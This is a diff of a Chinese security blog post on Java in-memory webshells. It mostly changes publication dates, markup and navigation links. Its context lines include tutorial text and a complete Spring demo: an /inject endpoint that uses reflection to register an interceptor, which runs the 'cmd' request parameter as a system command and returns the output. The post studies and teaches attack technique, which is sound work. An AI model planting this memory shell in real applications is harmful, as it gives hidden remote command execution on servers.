@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/09/19/java 内存马/"/>
+    <link rel="canonical" href="http://example.com/2025/09/22/java 内存马/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -134,13 +134,13 @@
         <meta name="description" content="本质上就是动态注册路由，接收参数 -&gt; 执行命令 -&gt; 返回结果 相比于传统 WebShell，无文件落地更隐蔽，也适用于不能解析 jsp 的环境 Tomcat Servlet 型内存马Servlet 注册流程先看正常注册一个 Servlet 的流程，传统 Servlet 是通过 web.xml 注册的，在 3.0 之后支持了使用注解注册 通过 xml 配置 Servlet打开 IDE">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java 内存马">
-<meta property="og:url" content="http://example.com/2025/09/19/Java%20%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:url" content="http://example.com/2025/09/22/Java%20%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
 <meta property="og:site_name" content="exp3n5ive&#39; Blog">
 <meta property="og:description" content="本质上就是动态注册路由，接收参数 -&gt; 执行命令 -&gt; 返回结果 相比于传统 WebShell，无文件落地更隐蔽，也适用于不能解析 jsp 的环境 Tomcat Servlet 型内存马Servlet 注册流程先看正常注册一个 Servlet 的流程，传统 Servlet 是通过 web.xml 注册的，在 3.0 之后支持了使用注解注册 通过 xml 配置 Servlet打开 IDE">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-09-19T11:07:54.291Z">
-<meta property="article:modified_time" content="2025-09-19T13:08:59.997Z">
+<meta property="article:published_time" content="2025-09-21T23:55:25.375Z">
+<meta property="article:modified_time" content="2025-09-24T07:16:40.959Z">
 <meta property="article:author" content="exp3n5ive">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -402,15 +402,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-09-19 19:07:54</span>
-        <span class="mobile">2025-09-19 19:07:54</span>
+        <span class="desktop">2025-09-22 07:55:25</span>
+        <span class="mobile">2025-09-22 07:55:25</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-19 21:08:59</span>
-            <span class="mobile">2025-09-19 21:08:59</span>
+            <span class="desktop">2025-09-24 15:16:40</span>
+            <span class="mobile">2025-09-24 15:16:40</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -1043,15 +1043,24 @@
 
 
 
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <h1 id="Spring-Controller-内存马"><a href="#Spring-Controller-内存马" class="headerlink" title="Spring Controller 内存马"></a>Spring Controller 内存马</h1><h2 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h2><p>我们知道在 Spring 中 , Controller 是负责对特定路由的请求进行处理的组件 , 所以我们想要在 Spring 环境中注入内存马就是要动态注册 Controller</p>
 <p>先写个测试代码：</p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
@@ -1084,15 +1093,15 @@
 <p>这里是将 Spring 的核心组件添加到 当前 HTTP 请求的上下文 中</p>
 <blockquote>
 <p>Spring 中有 九大组件：</p>
-<p><strong><font style="color:rgb(51, 51, 51);">DispatcherServlet</font></strong><font style="color:rgb(51, 51, 51);">（派发Servlet）：负责将请求分发给其他组件，是整个Spring MVC流程的核心；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">HandlerMapping</font></strong><font style="color:rgb(51, 51, 51);">（处理器映射）：用于确定请求的处理器（Controller）；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">HandlerAdapter</font></strong><font style="color:rgb(51, 51, 51);">（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">HandlerInterceptor</font></strong><font style="color:rgb(51, 51, 51);">（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">Controller</font></strong><font style="color:rgb(51, 51, 51);">（控制器）：处理用户请求并返回适当的模型和视图；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">ModelAndView</font></strong><font style="color:rgb(51, 51, 51);">（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">ViewResolver</font></strong><font style="color:rgb(51, 51, 51);">（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">LocaleResolver</font></strong><font style="color:rgb(51, 51, 51);">（区域解析器）：处理区域信息，用于国际化；</font></p>
-<p><strong><font style="color:rgb(51, 51, 51);">ThemeResolver</font></strong><font style="color:rgb(51, 51, 51);">（主题解析器）：用于解析Web应用的主题，实现界面主题的切换。</font></p>
+<p><strong>DispatcherServlet</strong>（派发Servlet）：负责将请求分发给其他组件，是整个Spring MVC流程的核心；</p>
+<p><strong>HandlerMapping</strong>（处理器映射）：用于确定请求的处理器（Controller）；</p>
+<p><strong>HandlerAdapter</strong>（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；</p>
+<p><strong>HandlerInterceptor</strong>（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；</p>
+<p><strong>Controller</strong>（控制器）：处理用户请求并返回适当的模型和视图；</p>
+<p><strong>ModelAndView</strong>（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；</p>
+<p><strong>ViewResolver</strong>（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；</p>
+<p><strong>LocaleResolver</strong>（区域解析器）：处理区域信息，用于国际化；</p>
+<p><strong>ThemeResolver</strong>（主题解析器）：用于解析Web应用的主题，实现界面主题的切换。</p>
 </blockquote>
 <p>接着看：</p>
 <p><img  
@@ -1101,8 +1110,8 @@
                      data-src="https://exp3n5ive.github.io/2025/09/19/Java%20%E5%86%85%E5%AD%98%E9%A9%AC/images/1757636370056-d9da9690-97bf-468a-b216-ad3756d27908.png"
                      
                 ></p>
-<p><font style="color:rgb(51, 51, 51);">这段代码是 Spring MVC 中处理 Flash Map 的逻辑，主要用于在重定向（redirect）场景下保持请求之间的数据传递</font></p>
-<p><font style="color:rgb(51, 51, 51);">举一个例子，一个人完成了注册，需要重定向到登录页面：</font></p>
+<p>这段代码是 Spring MVC 中处理 Flash Map 的逻辑，主要用于在重定向（redirect）场景下保持请求之间的数据传递</p>
+<p>举一个例子，一个人完成了注册，需要重定向到登录页面：</p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在控制器中</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/create-user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">createUser</span><span class="params">(<span class="meta">@RequestParam</span> String username, RedirectAttributes redirectAttrs)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    redirectAttrs.addFlashAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;User created successfully!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/login&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在重定向后的页面中可以直接使用 $&#123;message&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>不重要 , 接着看：</p>
@@ -1280,14 +1289,14 @@
 <p>detectHandlerMethods : </p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">detectHandlerMethods</span><span class="params">(<span class="keyword">final</span> Object handler)</span> &#123;</span><br><span class="line">  <span class="comment">//获取到当前Controller bean的class对象</span></span><br><span class="line">  Class&lt;?&gt; handlerType = (handler <span class="keyword">instanceof</span> String) ?</span><br><span class="line">        getApplicationContext().getType((String) handler) : handler.getClass();</span><br><span class="line">  <span class="comment">//同上，也是该Controller bean的class对象</span></span><br><span class="line">  <span class="keyword">final</span> Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);</span><br><span class="line">  <span class="comment">//获取当前bean的所有handler method。这里查找的依据便是根据method定义是否带有RequestMapping注解。如果有根据注解创建RequestMappingInfo对象</span></span><br><span class="line">  Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, <span class="keyword">new</span> <span class="title class_">MethodFilter</span>() &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matches</span><span class="params">(Method method)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getMappingForMethod(method, userType) != <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">//遍历并注册当前bean的所有handler method</span></span><br><span class="line">  <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">      <span class="type">T</span> <span class="variable">mapping</span> <span class="operator">=</span> getMappingForMethod(method, userType);</span><br><span class="line">      <span class="comment">//注册handler method，进入以下方法</span></span><br><span class="line">      registerHandlerMethod(handler, method, mapping);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-<p><font style="color:rgb(0, 0, 0);">这部分有两个关键功能，一个是 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.8);background-color:rgb(241, 241, 241);&quot;&gt;getMappingForMethod&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 方法根据 handler method 创建RequestMappingInfo 对象 :</font></p>
+<p>这部分有两个关键功能，一个是 <code>getMappingForMethod</code> 方法根据 handler method 创建RequestMappingInfo 对象 :</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://exp3n5ive.github.io/2025/09/19/Java%20%E5%86%85%E5%AD%98%E9%A9%AC/images/1758003574029-c1d71afb-ef7a-4f51-93a5-6e6476953f36.png"
                      
                 ></p>
-<p><font style="color:rgb(0, 0, 0);">一个是 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.8);background-color:rgb(241, 241, 241);&quot;&gt;registerHandlerMethod&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 方法 , 将 handler method 与 RequestMappingInfo 进行相关映射 :</font></p>
+<p>一个是 <code>registerHandlerMethod</code> 方法 , 将 handler method 与 RequestMappingInfo 进行相关映射 :</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -1296,7 +1305,7 @@
                 ></p>
 <p>这就和之前我们找到的注册 mapping 的地方对上了 , Controller 和 路径的映射关系就是存储在这里的</p>
 <hr>
-<h1 id="Spring-Interceptor-内存马"><a href="#Spring-Interceptor-内存马" class="headerlink" title="Spring Interceptor 内存马"></a>Spring Interceptor 内存马</h1><p><font style="color:rgb(0, 0, 0);">Interceptor 是 Spring 使用 AOP 对 Filter 思想的另一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。Intercepor 主要是针对 Controller 进行拦截</font></p>
+<h1 id="Spring-Interceptor-内存马"><a href="#Spring-Interceptor-内存马" class="headerlink" title="Spring Interceptor 内存马"></a>Spring Interceptor 内存马</h1><p>Interceptor 是 Spring 使用 AOP 对 Filter 思想的另一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。Intercepor 主要是针对 Controller 进行拦截</p>
 <h2 id="流程分析-踩坑"><a href="#流程分析-踩坑" class="headerlink" title="流程分析 + 踩坑"></a>流程分析 + 踩坑</h2><p>先正常创建一个 Interceptor :</p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;preHandle&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
@@ -1456,7 +1465,7 @@
 <p>好家伙原来用的是 adaptedInterceptors , 改一下赋值的地方就好了</p>
 <h2 id="Demo-4"><a href="#Demo-4" class="headerlink" title="Demo"></a>Demo</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.DispatcherServlet;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">interceptors</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        interceptors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">interceptorList</span> <span class="operator">=</span> (ArrayList) interceptors.get(mapping);</span><br><span class="line">        interceptorList.add(<span class="keyword">new</span> <span class="title class_">ShellInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span><br><span class="line">                <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;shellInterceptor&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>((<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream())));</span><br><span class="line">                    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        sb.append(line).append(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().write(sb.toString());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-<h1 id="Java-Agent-内存马"><a href="#Java-Agent-内存马" class="headerlink" title="Java Agent 内存马"></a><font style="color:rgb(0, 0, 0);">Java Agent 内存马</font></h1><h2 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JDK™ 5.0 中引入包<code>java.lang.instrument</code>。 该包提供了一个 Java 编程 API，可以用来开发增强 Java 应用程序的工具，例如监视它们或收集性能信息。使用  Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM  上的程序，甚至能够替换和修改某些类的定义。</p>
+<h1 id="Java-Agent-内存马"><a href="#Java-Agent-内存马" class="headerlink" title="Java Agent 内存马"></a>Java Agent 内存马</h1><h2 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JDK™ 5.0 中引入包<code>java.lang.instrument</code>。 该包提供了一个 Java 编程 API，可以用来开发增强 Java 应用程序的工具，例如监视它们或收集性能信息。使用  Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM  上的程序，甚至能够替换和修改某些类的定义。</p>
 <p>JavaAgent 是一种可以在 JVM 启动时或运行时附加的程序 , 有两种加载方式 :</p>
 <p>1 . <strong>Premain</strong> : 在 JVM 启动时通过 -javaagent:path&#x2F;to&#x2F;your-agent.jar 来指定</p>
 <p>2 . <strong>Agentmain</strong> : 在 JVM 启动之后通过 Attach Api 动态附加到正在运行的 JVM 进程上</p>
@@ -1574,15 +1583,15 @@
         <li><strong>Title:</strong> Java 内存马</li>
         <li><strong>Author:</strong> exp3n5ive</li>
         <li><strong>Created at
-                :</strong> 2025-09-19 19:07:54</li>
+                :</strong> 2025-09-22 07:55:25</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-19 21:08:59
+                    :</strong> 2025-09-24 15:16:40
             </li>
         
         <li>
-            <strong>Link:</strong> https://exp3n5ive.github.io/2025/09/19/Java 内存马/
+            <strong>Link:</strong> https://exp3n5ive.github.io/2025/09/22/Java 内存马/
         </li>
         <li>
             <strong>
@@ -1608,12 +1617,12 @@
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
 			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/09/21/UTF-8%20OverlongEncoding/">
+				<a class="prev" rel="prev" href="/2025/09/22/CVE-2025-26467/">
 					<span class="left arrow-icon flex justify-center items-center">
 						<i class="fa-solid fa-chevron-left"></i>
 					</span>
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">UTF-8 OverlongEncoding</span>
+						<span class="post-nav-title-item truncate max-w-48">CVE-2025-26467 复现记录</span>
 						<span class="post-nav-item">Prev posts</span>
 					</span>
 				</a>
@@ -1621,9 +1630,9 @@
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/09/12/CVE-2025-26467/">
+				<a class="next" rel="next" href="/2025/09/21/UTF-8%20OverlongEncoding/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">CVE-2025-26467 复现记录</span>
+						<span class="post-nav-title-item truncate max-w-48">UTF-8 OverlongEncoding</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -1717,7 +1726,7 @@
                     </span>
                     
                         <span>
-                            29.2k words in total
+                            29.1k words in total
                         </span>
                     
                 </p>
